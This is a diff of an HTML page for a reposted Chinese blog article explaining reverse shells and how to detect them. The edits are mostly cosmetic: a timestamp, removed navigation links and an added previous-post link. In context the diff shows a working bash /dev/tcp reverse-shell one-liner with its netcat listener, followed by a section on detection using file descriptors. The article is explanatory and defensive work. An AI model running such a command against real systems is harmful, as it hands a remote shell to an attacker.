@@ -64,7 +64,7 @@
 <meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104112969-1097291178.png">
 <meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215105358151-246000034.png">
 <meta property="article:published_time" content="2023-02-04T05:38:46.000Z">
-<meta property="article:modified_time" content="2023-02-04T05:41:39.367Z">
+<meta property="article:modified_time" content="2023-02-05T03:35:16.641Z">
 <meta property="article:author" content="lp">
 <meta property="article:tag" content="转载">
 <meta property="article:tag" content="linux">
@@ -430,7 +430,7 @@
 </ul>
 </li>
 </ul>
-<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop">回到顶部(go to top)</a></p>
+<p><code>1</code></p>
 <h1 id="1-反弹Shell的概念本质"><a href="#1-反弹Shell的概念本质" class="headerlink" title="1. 反弹Shell的概念本质"></a>1. 反弹Shell的概念本质</h1><p>所谓的反弹shell（reverse shell），就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。 </p>
 <p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215220831022-201658057.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>本文会先分别讨论：</p>
@@ -439,7 +439,6 @@
 <li>网络通信（network api）</li>
 </ul>
 <p>这两个基础原子概念，然后在之后的章节中用组合的方式来呈现现在主流的反弹shell技术方式及其原理，用这种横向和纵向拆分的方式来帮助读者朋友更好地理解反弹shell。</p>
-<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop">回到顶部(go to top)</a></p>
 <h1 id="2-网络通信（network-api）方式讨论"><a href="#2-网络通信（network-api）方式讨论" class="headerlink" title="2. 网络通信（network api）方式讨论"></a>2. 网络通信（network api）方式讨论</h1><h2 id="0x1：-x2F-dev-x2F-tcp-udp-【4层协议】"><a href="#0x1：-x2F-dev-x2F-tcp-udp-【4层协议】" class="headerlink" title="0x1：&#x2F;dev&#x2F;[tcp|udp]【4层协议】"></a>0x1：&#x2F;dev&#x2F;[tcp|udp]【4层协议】</h2><h3 id="1-从文件描述（file-descriptor）符说起"><a href="#1-从文件描述（file-descriptor）符说起" class="headerlink" title="1. 从文件描述（file descriptor）符说起"></a>1. 从文件描述（file descriptor）符说起</h3><p>linux文件描述符可以理解为<strong>linux跟踪打开文件而分配的一个数字句柄</strong>，这个数字本质上是一个文件句柄，通过句柄就可以实现文件的读写操作。</p>
 <p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
 <ul>
@@ -507,12 +506,10 @@
 <h2 id="0x2：通过建立socket-tcp连接实现网络通信【4层协议】"><a href="#0x2：通过建立socket-tcp连接实现网络通信【4层协议】" class="headerlink" title="0x2：通过建立socket tcp连接实现网络通信【4层协议】"></a>0x2：通过建立socket tcp连接实现网络通信【4层协议】</h2><h2 id="0x3：使用ICMP实现网络通信【4层协议】"><a href="#0x3：使用ICMP实现网络通信【4层协议】" class="headerlink" title="0x3：使用ICMP实现网络通信【4层协议】"></a>0x3：使用ICMP实现网络通信【4层协议】</h2><h2 id="0x4：使用DNS实现网络通信【7层协议】"><a href="#0x4：使用DNS实现网络通信【7层协议】" class="headerlink" title="0x4：使用DNS实现网络通信【7层协议】"></a>0x4：使用DNS实现网络通信【7层协议】</h2><p><strong>Relevant Link:</strong> </p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2548</span> <br></code></pre></td></tr></table></figure>
 
-<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop">回到顶部(go to top)</a></p>
 <h1 id="3-命令执行（system-executor）方式讨论"><a href="#3-命令执行（system-executor）方式讨论" class="headerlink" title="3. 命令执行（system executor）方式讨论"></a>3. 命令执行（system executor）方式讨论</h1><h2 id="0x1：通过管道符传递指令"><a href="#0x1：通过管道符传递指令" class="headerlink" title="0x1：通过管道符传递指令"></a>0x1：通过管道符传递指令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello&quot;</span> | <span class="hljs-built_in">cat</span><br></code></pre></td></tr></table></figure>
 
 <h2 id="0x2：通过调用glibc-api执行系统指令"><a href="#0x2：通过调用glibc-api执行系统指令" class="headerlink" title="0x2：通过调用glibc api执行系统指令"></a>0x2：通过调用glibc api执行系统指令</h2><p>本质上来说，Linux系统中的ring3应用程序启动时都会加载glibc.so库，glibc库中对Linux系统调用实现了封装。应用程序可以像使用C库那样，安全地使用系统调用。</p>
 <h2 id="0x3：通过直接调用系统调用执行指令"><a href="#0x3：通过直接调用系统调用执行指令" class="headerlink" title="0x3：通过直接调用系统调用执行指令"></a>0x3：通过直接调用系统调用执行指令</h2><p>一般来说，应用程序可以通过glibc封装出的接口来使用系统调用，这样避免一些锁、传参检查等问题。但是技术上，应用程序完全也可以绕过glibc，直接发起syscall系统调用。</p>
-<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop">回到顶部(go to top)</a></p>
 <h1 id="4-反弹Shell攻击组合方式讨论"><a href="#4-反弹Shell攻击组合方式讨论" class="headerlink" title="4. 反弹Shell攻击组合方式讨论"></a>4. 反弹Shell攻击组合方式讨论</h1><p>有了之前对命令执行和网络通信方式底层原理的讨论之后，这一章开始，我们将其进行横向和纵向的组合，讨论具体的反弹Shell姿势，并对每种姿势的底层原理进行分析。</p>
 <h2 id="0x1：“重定向符”-”-x2F-dev-x2F-tcp网络通信”Bash反弹Shell"><a href="#0x1：“重定向符”-”-x2F-dev-x2F-tcp网络通信”Bash反弹Shell" class="headerlink" title="0x1：“重定向符”+”&#x2F;dev&#x2F;tcp网络通信”Bash反弹Shell"></a>0x1：“重定向符”+”&#x2F;dev&#x2F;tcp网络通信”Bash反弹Shell</h2><p>这一类反弹shell的本质是把bash&#x2F;zsh等进程的 0 1 2 输入输出重定向到远程socket，由socket中获取输入，重定向 标准输出（1）和错误输出（2）到socket。</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">attacker</span>机器上执行：<br><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">2333</span><br><br><span class="hljs-attribute">victim</span> 机器上执行：<br><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.146.129</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
@@ -697,7 +694,6 @@
 <p><strong>Relevant Link:</strong> </p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2549</span><br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/r00tgrok/</span>p/reverse_shell_cheatsheet.html<br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/shanmao/</span>archive<span class="hljs-regexp">/2012/</span><span class="hljs-number">12</span><span class="hljs-regexp">/26/</span><span class="hljs-number">2834210</span>.html<br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6727</span><br></code></pre></td></tr></table></figure>
 
-<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop">回到顶部(go to top)</a></p>
 <h1 id="5-反弹Shell检测思路"><a href="#5-反弹Shell检测思路" class="headerlink" title="5. 反弹Shell检测思路"></a>5. 反弹Shell检测思路</h1><h2 id="1-进程-file-descriptor-异常检测"><a href="#1-进程-file-descriptor-异常检测" class="headerlink" title="1.进程 file descriptor 异常检测"></a>1.进程 file descriptor 异常检测</h2><h3 id="1-1-检测-file-descriptor-是否指向一个socket"><a href="#1-1-检测-file-descriptor-是否指向一个socket" class="headerlink" title="1.1 检测 file descriptor 是否指向一个socket"></a>1.1 检测 file descriptor 是否指向一个socket</h3><p>以“重定向符”+”&#x2F;dev&#x2F;tcp网络通信”Bash反弹Shell这一类最经典的反弹Shell攻击方式为例，这类反弹shell的本质可以归纳为<strong>file descriptor的重定向到一个socket句柄</strong>。</p>
 <p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104034125-1531808234.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p> <img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104112969-1097291178.png" srcset="/img/loading.gif" lazyload alt="img"> </p>
@@ -789,6 +785,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2023/02/05/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E2%80%94%E2%80%94%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BC%B9shell%E6%A3%80%E6%B5%8B%EF%BC%9F/" title="入侵检测——如何实现反弹shell检测？">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">入侵检测——如何实现反弹shell检测？</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
